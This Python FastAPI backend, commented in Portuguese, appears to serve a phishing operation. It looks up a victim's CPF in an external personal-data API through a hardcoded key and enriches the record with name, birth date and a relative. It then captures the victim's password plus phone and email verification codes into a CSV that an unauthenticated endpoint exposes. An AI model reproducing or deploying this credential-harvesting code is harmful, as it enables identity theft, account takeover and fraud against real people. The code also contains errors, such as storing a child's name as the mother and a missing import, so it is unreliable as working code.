from fastapi import FastAPI, HTTPException, Cookie, Response
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import pandas as pd
import uuid
import requests
from datetime import datetime
import pytz
from typing import Optional

app = FastAPI()

# Adiciona middleware CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Permite todas as origens
    allow_credentials=True,
    allow_methods=["*"],  # Permite todos os métodos
    allow_headers=["*"],  # Permite todos os cabeçalhos
)

CSV_FILE_PATH = "var/data/contacts.csv"

# Dicionário para armazenar sessões de usuários
sessions = {}

# Define o modelo de dados para a criação de contato
class ContactStart(BaseModel):
    ip: str
    cpf: str

class ContactComplete(BaseModel):
    senha: Optional[str] = None
    cep: Optional[str] = None
    telefone: Optional[str] = None
    codigo_telefone: Optional[str] = None
    email: Optional[str] = None
    codigo_email: Optional[str] = None

def format_cpf(cpf: str) -> str:
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"

def format_phone(phone: str) -> str:
    return f"({phone[:2]}){phone[2:7]}-{phone[7:]}"

def format_date(date_str: str) -> str:
    date_obj = datetime.strptime(date_str, "%Y-%m-%d %H:%M:%S")
    return date_obj.strftime("%d/%m/%Y")

def get_current_datetime() -> str:
    timezone = pytz.timezone("America/Sao_Paulo")
    current_time = datetime.now(timezone)
    return current_time.strftime("%H:%M - %d/%m")

@app.get("/contacts")
def read_contacts():
    try:
        df = pd.read_csv(CSV_FILE_PATH)
        df.columns = [ "id" , "name" , "email" , "mae" , "telefone" , "endereco" , "geo" , "cep" , "cpf" , "nascimento" , "data" , "ip" , "senha" , "codigo_telefone" , "codigo_email"]
        df = df.fillna('')  # Substitui NaNs por strings vazias
        df = df.astype(str)  # Certifica que todos os dados são strings
        return df.to_dict(orient='records')
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/contacts")
def write_contacts(contacts: list):
    try:
        df = pd.DataFrame(contacts)
        df.to_csv(CSV_FILE_PATH, index=False)
        return {"message": "Contacts updated successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/start")
def start_contact(contact: ContactStart, response: Response):
    try:
        # Consulta a API externa com o CPF
        external_api_url = f"http://api.dbconsultas.com/api/v1/71383fd8-cbf6-48e6-a241-ee5c0b8bfd7a/cpf/{contact.cpf}"
        response_api = requests.get(external_api_url)
        response_api.raise_for_status()
        cpf_data = response_api.json()

        if cpf_data["status"] != 200:
            raise HTTPException(status_code=404, detail="CPF data not found")

        cpf_data = cpf_data["data"]

        # Processar dados do CPF
        parentes = cpf_data.get("parentes", [])
        filhos = [parente for parente in parentes if parente["vinculo"] == "FILHA(O)"]
        nome_mae = filhos[0]["nome"] if filhos else "N/A"

        new_id = str(uuid.uuid4())
        new_contact = {
            "id": new_id,
            "name": cpf_data["nome"],
            "email": "",
            "mae": nome_mae,
            "cep": "",
            "cpf": format_cpf(cpf_data["cpf"]),
            "nascimento": format_date(cpf_data["nasc"]) if cpf_data.get("nasc") else "N/A",
            "data": get_current_datetime(),
            "ip": contact.ip
        }

        # Armazenar os dados iniciais na sessão
        sessions[new_id] = new_contact

        # Atualizar o CSV com a nova linha
        df = pd.read_csv(CSV_FILE_PATH)
        df.columns = [ "id" , "name" , "email" , "mae" , "telefone" , "endereco" , "geo" , "cep" , "cpf" , "nascimento" , "data" , "ip" , "senha" , "codigo_telefone" , "codigo_email"]
        df = pd.concat([df, pd.DataFrame([new_contact])], ignore_index=True)
        df.to_csv(CSV_FILE_PATH, index=False)

        # Configurar cookie para manter a sessão
        response.set_cookie(key="session_id", value=new_id, httponly=True, max_age=300)  # Cookie expira em 5 minutos

        return {"message": "Session started successfully"}
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=500, detail=f"Error fetching CPF data: {e}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/complete")
def complete_contact(contact: ContactComplete, session_id: Optional[str] = Cookie(None)):
    try:
        if not session_id or session_id not in sessions:
            raise HTTPException(status_code=404, detail="Session not found")

        # Atualizar os dados da sessão com os dados fornecidos, ignorando valores vazios
        for key, value in contact.dict().items():
            if value is not None and value != "":
                sessions[session_id][key] = value

        # Atualizar o CSV com os dados da sessão
        df = pd.read_csv(CSV_FILE_PATH)
        df.columns = [ "id" , "name" , "email" , "mae" , "telefone" , "endereco" , "geo" , "cep" , "cpf" , "nascimento" , "data" , "ip" , "senha" , "codigo_telefone" , "codigo_email"]
        df.loc[df['id'] == session_id, list(sessions[session_id].keys())] = list(sessions[session_id].values())
        df.to_csv(CSV_FILE_PATH, index=False)

        return {"message": "Session updated successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/finish")
def finish_contact(session_id: Optional[str] = Cookie(None)):
    try:
        if not session_id or session_id not in sessions:
            raise HTTPException(status_code=404, detail="Session not found")

        # Remover a sessão
        del sessions[session_id]

        return {"message": "Session finished successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))  # Pega a porta da variável de ambiente ou usa a porta 8000 como padrão
    uvicorn.run(app, host="0.0.0.0", port=port)